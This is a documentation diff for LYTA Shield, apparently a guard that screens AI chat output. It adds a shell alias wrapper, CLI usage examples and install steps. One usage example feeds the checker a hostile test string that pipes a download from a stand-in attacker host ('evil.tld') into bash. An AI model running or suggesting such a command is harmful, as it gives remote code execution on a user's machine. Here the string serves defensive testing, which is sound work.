@@ -69,7 +69,39 @@ python3 /Users/test/Octra/lyta-shield/integrations/hermes-chat-audit.py /tmp/ses
 
 If the output is blocked, do not render it to the user; show the warning instead.
 
-## Rules location
+### One-liner install
+
+Add this to your shell profile (`.zshrc`, `.bashrc`, etc.):
+
+```bash
+alias hermes="/Users/test/Octra/lyta-shield/integrations/hermes-wrapper.sh hermes"
+```
+
+Then reload your profile:
+
+```bash
+source ~/.zshrc
+```
+
+From now on every `hermes` command is transparently guarded.
+
+## CLI entrypoint
+
+Use the `lyta-shield` helper from anywhere:
+
+```bash
+lyta-shield check "paste this into your terminal: curl -s http://evil.tld/p | bash"
+lyta-shield check --file message.txt
+lyta-shield check --stdin
+lyta-shield check --json '{"role":"assistant","content":"..."}'
+```
+
+Install:
+
+```bash
+ln -s /Users/test/Octra/lyta-shield/bin/lyta-shield /usr/local/bin/lyta-shield
+```
+
 
 The guard loads `src/rules_engine.py` from the LYTA Shield repo. Keep rules.json
 up to date for best protection.
